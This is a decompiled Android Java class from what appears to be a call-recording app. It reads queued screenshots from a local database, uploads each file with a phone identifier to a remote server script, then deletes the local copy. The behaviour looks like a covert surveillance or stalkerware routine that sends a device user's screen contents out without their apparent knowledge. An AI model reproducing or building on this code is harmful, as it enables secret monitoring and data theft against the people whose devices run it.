package com.yasoka.spcallrecord.recorder.call.a.c.i;

import a.c.b.J;
import a.c.b.k0;
import a.c.e.a;
import a.c.e.e;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.text.TextUtils;
import androidx.browser.trusted.sharing.ShareTarget;
import com.app.service.UploadDataService;
import com.crashlytics.android.Crashlytics;
import java.io.File;
import java.util.HashMap;
import java.util.Map;
import okhttp3.MediaType;
import okhttp3.MultipartBody.Part;
import okhttp3.RequestBody;

/* compiled from: SendScreenshot */
public class o implements Runnable {

    /* renamed from: b reason: collision with root package name */
    public static boolean f289b;

    /* renamed from: a reason: collision with root package name */
    private final Context f290a;

    public o(Context context) {
        this.f290a = context;
    }

    private void a(J j, k0 k0Var) {
        try {
            HashMap hashMap = new HashMap();
            StringBuilder sb = new StringBuilder();
            sb.append("");
            sb.append(e.e(this.f290a));
            hashMap.put("idPhone", sb.toString());
            hashMap.put("date", j.a());
            hashMap.put("data", j.c());
            if (a.b("screenshot/insertScreenError.php", (Map<String, String>) hashMap)) {
                k0Var.a(j.b());
            }
        } catch (Exception e2) {
            e2.getStackTrace();
            try {
                e2.getStackTrace();
                Crashlytics.logException(e2);
            } catch (Exception unused) {
            }
        }
    }

    /* JADX WARNING: Removed duplicated region for block: B:33:0x00e8 A[Catch:{ Exception -> 0x00ee }] */
    public synchronized void run() {
        try {
            if (f289b) {
                a();
                return;
            }
            f289b = true;
            k0 k0Var = new k0(this.f290a);
            k0Var.b();
            Cursor c2 = k0Var.c();
            if (c2 == null || c2.getCount() <= 0 || !c2.moveToFirst()) {
                k0Var.a();
                if (c2 != null) {
                    c2.close();
                }
                f289b = false;
                a();
            }
            do {
                J j = new J();
                j.a(c2.getInt(0));
                j.b(c2.getString(1));
                j.c(c2.getString(2));
                j.a(c2.getString(3));
                if (TextUtils.isEmpty(j.d())) {
                    a(j, k0Var);
                } else {
                    HashMap hashMap = new HashMap();
                    StringBuilder sb = new StringBuilder();
                    sb.append("");
                    sb.append(e.e(this.f290a));
                    hashMap.put("idPhone", com.app.retrofit.a.a(sb.toString()));
                    hashMap.put("pathFile", com.app.retrofit.a.a(j.c()));
                    hashMap.put("date", com.app.retrofit.a.a(j.a()));
                    File file = new File(j.d());
                    if (file.exists()) {
                        if (a.a("screenshot/insertScreen.php", hashMap, Part.createFormData("uploadedfile", file.getName(), RequestBody.create(MediaType.parse(ShareTarget.ENCODING_TYPE_MULTIPART), file))) && k0Var.a(j.b()) && file.exists()) {
                            file.delete();
                        }
                    } else {
                        a(j, k0Var);
                    }
                }
            } while (c2.moveToNext());
            k0Var.a();
            if (c2 != null) {
            }
            f289b = false;
            a();
        } catch (Exception e2) {
            e2.getStackTrace();
        }
    }

    private void a() {
        try {
            UploadDataService.b();
            StringBuilder sb = new StringBuilder();
            sb.append("UploadDataService.getmNbTask() : ");
            sb.append(UploadDataService.f1272b);
            sb.toString();
            if (UploadDataService.f1272b <= 0) {
                this.f290a.stopService(new Intent(this.f290a, UploadDataService.class));
            }
        } catch (Throwable th) {
            try {
                th.getStackTrace();
                Crashlytics.logException(th);
            } catch (Exception unused) {
            }
        }
    }
}
